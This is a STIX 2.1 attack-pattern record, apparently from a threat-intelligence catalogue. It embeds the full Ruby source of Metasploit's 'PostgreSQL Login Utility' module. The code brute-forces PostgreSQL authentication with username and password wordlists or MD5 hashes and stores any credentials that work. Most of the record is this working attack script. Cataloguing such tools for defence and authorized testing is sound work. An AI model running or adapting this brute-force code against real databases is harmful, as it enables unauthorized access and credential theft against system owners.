{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--67cd7f75-cbc7-4695-a4d7-baf420b654d7",
    "created": "2024-08-14T16:31:22.457797Z",
    "modified": "2024-08-14T16:31:22.457801Z",
    "name": "PostgreSQL Login Utility",
    "description": " This module attempts to authenticate against a PostgreSQL instance using username and password combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options. Note that passwords may be either plaintext or MD5 formatted hashes. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/postgres/postgres_login.rb",
            "external_id": "postgres_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.postgresql.org/"
        },
        {
            "source_name": "reference",
            "url": "https://hashcat.net/forum/archive/index.php?thread-4148.html#PasstheHash"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/postgres'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Postgres\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  # Creates an instance of this module.\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PostgreSQL Login Utility',\n      'Description'    => %q{\n        This module attempts to authenticate against a PostgreSQL\n        instance using username and password combinations indicated\n        by the USER_FILE, PASS_FILE, and USERPASS_FILE options. Note that\n        passwords may be either plaintext or MD5 formatted hashes.\n      },\n      'Author'         => [ 'todb' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'https://www.postgresql.org/' ],\n          [ 'CVE', '1999-0502'], # Weak password\n          [ 'URL', 'https://hashcat.net/forum/archive/index.php?thread-4148.html' ] # Pass the Hash\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::Proxies,\n        OptPath.new('USERPASS_FILE',  [ false, \"File containing (space-separated) users and passwords, one pair per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"postgres_default_userpass.txt\") ]),\n        OptPath.new('USER_FILE',      [ false, \"File containing users, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"postgres_default_user.txt\") ]),\n        OptPath.new('PASS_FILE',      [ false, \"File containing passwords, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"postgres_default_pass.txt\") ]),\n      ])\n\n    deregister_options('SQL', 'PASSWORD_SPRAY')\n\n  end\n\n  # Loops through each host in turn. Note the current IP address is both\n  # ip and datastore['RHOST']\n  def run_host(ip)\n    cred_collection = build_credential_collection(\n      realm: datastore['DATABASE'],\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::Postgres.new(\n      host: ip,\n      port: rport,\n      proxies: datastore['PROXIES'],\n      cred_details: cred_collection,\n      stop_on_success: datastore['STOP_ON_SUCCESS'],\n      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n      connection_timeout: 30,\n      framework: framework,\n      framework_module: self,\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\"\n      end\n    end\n\n  end\n\n  # Alias for RHOST\n  def rhost\n    datastore['RHOST']\n  end\n\n  # Alias for RPORT\n  def rport\n    datastore['RPORT']\n  end\n\n\n\nend\n"
}